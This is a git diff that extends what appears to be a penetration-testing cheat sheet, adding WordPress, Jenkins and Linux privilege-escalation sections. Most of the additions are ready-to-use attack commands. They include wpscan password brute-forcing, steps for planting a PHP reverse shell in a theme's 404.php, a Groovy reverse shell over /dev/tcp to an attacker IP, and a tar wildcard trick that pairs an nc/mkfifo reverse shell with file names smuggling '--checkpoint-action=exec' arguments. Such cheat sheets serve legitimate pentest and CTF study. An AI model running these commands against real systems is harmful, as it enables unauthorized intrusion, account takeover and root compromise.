@@ -182,22 +182,28 @@ If there is an open HTTP proxy, connect to it by configuring a proxy in your bro
 - Check Firefox debugger for outdated javascript libraries
 - Look for /robots.txt and /sitemap.xml
 
-### Tool Nikto
+#### Find subdomains from html pages
+```
+curl <WEBPAGE>
+grep -o '[^/]*\.<DOMAIN>\.com' index.html | sort -u > subdomains.txt
+```
+
+### Vulnerability scanning - Nikto
 Nikto is used for vulnerability scanning a web application.
 ```
 nikto -host <URL> -output nikto-URL.txt
 ```
 
-### Tools Directory fuzzing
+### Directory fuzzing
 Directory fuzzing is used to fuzz directories on a website.
-#### Tool Dirb
+#### Directory fuzzing - Dirb
 Use the -R to disable recursive scanning
 ```
 dirb <URL> /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o dirb-<URL>.txt
 dirb <URL> /usr/share/dirb/wordlists/big.txt -o dirb-<URL>.txt
 ```
 
-#### Tool Gobuster
+#### Directory fuzzing - Gobuster
 - use the ```-b``` flag to blacklist status codes.
 ```
 gobuster dir -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u <URL> gobuster-<URL>.txt
@@ -206,8 +212,37 @@ gobuster dir -w /opt/SecLists/Discovery/Web-Content/big.txt -u <URL> gobuster-<U
 
 #### Usefull flags Dirb
 ```
--p set op a proxy <IP:PORT>
+-p set up a proxy <IP:PORT>
 -X Append each word with this extensions.
+```
+
+### Wordpress
+#### Scan Wordpress
+```
+wpscan -url <URL>
+```
+
+#### Bruteforce login
+```
+wpscan --url <URL> --usernames <USERNAME> --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
+```
+
+#### Upload a reveare shell
+1. Login --> Appearance --> Theme editor --> 404.php
+2. gedit /usr/share/webshells/php/php-reverse-shell.php
+3. Paste in 404.php
+4. Start listener and go to an unexisting page in the browser
+
+### Jenkings
+#### Execute commands
+- After login go to /script
+
+#### Reverse java shell
+```
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
 ```
 
 ### SMTP
@@ -698,6 +733,14 @@ Use the following instead of just sudo <PROGRAM>
 ```
 sudo -u root <PATH TO PROGRAM> #manier1
 ./.suid_bash -p #manier2
+```
+  
+#### Wildcard privileges
+Exploiting wildcard for privilege escalation (For example tar * in this directory) https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
+```
+echo "mkfifo /tmp/lhennp; nc <IP> <PORT> 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" > --checkpoint=1
 ```
   
 ### Privesc Linux Tricks
